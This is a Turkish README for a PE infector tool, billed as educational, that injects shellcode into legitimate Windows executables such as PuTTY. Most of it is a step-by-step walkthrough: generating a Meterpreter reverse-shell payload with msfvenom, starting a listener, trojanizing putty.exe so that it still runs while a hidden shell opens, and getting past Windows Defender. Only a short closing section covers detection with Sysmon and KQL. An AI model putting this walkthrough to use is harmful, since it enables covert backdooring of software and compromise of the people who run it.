# PE Infector v2.0

Shellter benzeri PE enfeksiyon aracı. Meşru EXE dosyalarına shellcode enjekte eder.

## ⚠️ YASAL UYARI

Bu araç **SADECE EĞİTİM AMAÇLIDIR**. İzole lab ortamları dışında kullanmak yasadışıdır!

## Özellikler

- ✅ **x86 ve x64 tam destek**
- ✅ **Code cave tespiti** - Mevcut boşlukları kullanır
- ✅ **Yeni section ekleme** - Code cave yoksa otomatik section ekler
- ✅ **Register koruma** - PUSHAD/POPAD (x86) veya manuel (x64)
- ✅ **Entry point hijacking** - Shellcode'a yönlendirir, sonra orijinal koda döner
- ✅ **Doğrulama** - Enjeksiyonun başarılı olduğunu kontrol eder

## Kurulum

```bash
pip install pefile
```

## Kullanım

### İnteraktif Mod (Önerilen)

```bash
python pe_infector.py
```

Adım adım size sorar:
1. Hedef PE dosyası
2. Shellcode kaynağı
3. Enjeksiyon yöntemi
4. Çıktı dosyası

### Komut Satırı

```bash
# Kendi shellcode'unuzla
python pe_infector.py -t putty.exe -s payload.bin -o infected.exe

# Test shellcode ile (calc.exe açar)
python pe_infector.py -t putty.exe --test -o infected.exe

# Yeni section ekle (kesin çalışır)
python pe_infector.py -t putty.exe -s payload.bin --method section

# Sadece analiz (code cave'leri göster)
python pe_infector.py -t putty.exe --analyze
```

---

## Tam Demo: Kali → Windows Reverse Shell

### Adım 1: Kali'de Shellcode Üret

```bash
# x64 Windows hedef için
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.100 \
         LPORT=4444 \
         -f raw \
         -o payload.bin

# x86 Windows hedef için
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.1.100 \
         LPORT=4444 \
         -f raw \
         -o payload.bin
```

### Adım 2: Kali'de Listener Başlat

```bash
msfconsole -q

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # veya windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

### Adım 3: Dosyaları Windows'a Transfer Et

```bash
# Kali'de HTTP server
python3 -m http.server 8080
```

```powershell
# Windows'ta indir
Invoke-WebRequest http://192.168.1.100:8080/pe_infector.py -OutFile pe_infector.py
Invoke-WebRequest http://192.168.1.100:8080/payload.bin -OutFile payload.bin

# PuTTY indir (hedef uygulama)
Invoke-WebRequest https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -OutFile putty.exe
```

### Adım 4: Windows'ta Enjeksiyon

```powershell
# Bağımlılık kur
pip install pefile

# Enjeksiyon yap
python pe_infector.py -t putty.exe -s payload.bin -o putty_infected.exe
```

**Beklenen Çıktı:**
```
[*] PE dosyası yükleniyor: putty.exe
[*] Mimari: x64 (64-bit)
[*] Original Entry Point (RVA): 0x54b90
...
[+] Code cave bulundu: .text (padding)
    RVA: 0x52400
    Boyut: 4096 bytes
...
[*] Entry Point değiştirildi:
    Eski EP (RVA): 0x54b90
    Yeni EP (RVA): 0x52400
...
[+] Enjeksiyon tamamlandı!
[+] Kaydedildi: putty_infected.exe
```

### Adım 5: Enfekte Dosyayı Çalıştır

```powershell
.\putty_infected.exe
```

### Adım 6: Kali'de Session Al

```
[*] Sending stage (200774 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:49847)

meterpreter > sysinfo
Computer        : DESKTOP-TARGET
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x64/windows

meterpreter > getuid
Server username: DESKTOP-TARGET\victim

meterpreter > shell
C:\Users\victim> whoami
desktop-target\victim
```

---

## Nasıl Çalışır?

```
ORIJINAL EXE                     ENFEKTELİ EXE
─────────────                    ─────────────

┌─────────────────┐              ┌─────────────────┐
│   PE Header     │              │   PE Header     │
│                 │              │                 │
│ Entry Point:────┼──┐           │ Entry Point:────┼──┐
│ 0x54B90         │  │           │ 0x52400 (YENİ)  │  │
└─────────────────┘  │           └─────────────────┘  │
                     │                                │
┌─────────────────┐  │           ┌─────────────────┐  │
│   .text         │  │           │   .text         │  │
│                 │  │           │                 │  │
│ 0x54B90:   ◄────┼──┘           │ 0x52400:   ◄────┼──┘
│ (orijinal kod)  │              │ PUSH registers  │
│                 │              │ [SHELLCODE]     │──► Reverse Shell!
│                 │              │ POP registers   │
│ ...             │              │ JMP 0x54B90 ────┼──┐
│                 │              │                 │  │
│ 0x52400:        │              │ 0x54B90:   ◄────┼──┘
│ (boş alan)      │              │ (orijinal kod)  │──► PuTTY normal açılır
│                 │              │                 │
└─────────────────┘              └─────────────────┘
```

**Akış:**
1. Kullanıcı `putty_infected.exe` çalıştırır
2. Windows yeni Entry Point'e atlar (0x52400)
3. Register'lar kaydedilir (PUSHAD/POPAD veya manuel)
4. Shellcode çalışır → Reverse shell bağlantısı
5. Register'lar geri yüklenir
6. JMP ile orijinal Entry Point'e atlanır (0x54B90)
7. PuTTY normal başlar → Kullanıcı farkında değil!

---

## Enjeksiyon Yöntemleri

### 1. Code Cave (Varsayılan)
- Mevcut boşlukları kullanır
- Dosya boyutu değişmez
- Daha stealth

### 2. Yeni Section
- Yeni `.shell` section'ı ekler
- Dosya boyutu artar
- Her zaman çalışır

```bash
# Code cave bulunamazsa otomatik section ekle
python pe_infector.py -t app.exe -s payload.bin --method auto

# Sadece code cave (bulunamazsa hata)
python pe_infector.py -t app.exe -s payload.bin --method cave

# Her zaman yeni section (güvenli)
python pe_infector.py -t app.exe -s payload.bin --method section
```

---

## Sorun Giderme

### "Uygun code cave bulunamadı"
```bash
# --method section kullan
python pe_infector.py -t app.exe -s payload.bin --method section
```

### "Shellcode çok büyük"
- Daha küçük payload kullan: `msfvenom ... -e x64/xor -i 3`
- Section ekleme kullan: `--method section`

### "Çalışmıyor, crash oluyor"
- Mimariyi kontrol et (x86 shellcode x64 EXE'de çalışmaz)
- Staged vs stageless payload kontrol et

### Windows Defender engelliyor
- Test için Defender'ı kapat
- Veya daha sofistike encoding kullan

---

## Tespit ve Savunma (Blue Team)

Bu tür saldırıları tespit etmek için:

1. **Hash kontrolü** - Bilinen-iyi hash ile karşılaştır
2. **Entry Point analizi** - EP'nin section başında olması normal
3. **İmza doğrulama** - Değiştirilen dosyada imza bozulur
4. **Section izinleri** - RWX şüpheli
5. **Yüksek entropi** - Encoded shellcode yüksek entropi gösterir

### Sysmon Tespiti
```
Event ID 1: Process Create
- ParentImage beklenmedik
- Image hash bilinen-kötü listesinde

Event ID 3: Network Connection
- Process başladıktan hemen sonra dış IP'ye bağlantı
```

### KQL Sorgusu
```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName endswith ".exe"
| where FolderPath has_any ("\\Downloads\\", "\\Temp\\", "\\Desktop\\")
| join kind=inner (
    DeviceNetworkEvents 
    | where RemoteIPType == "Public"
) on DeviceId, ProcessId
```

---

## Yazar

**Uğur Ateş**
- SOC Team Lead - Aviation Cybersecurity
- Medium: @ugur.can.ates
- Web: ugurcanates.com

---

## Lisans

Sadece eğitim amaçlı. Kötüye kullanımdan kullanıcı sorumludur.
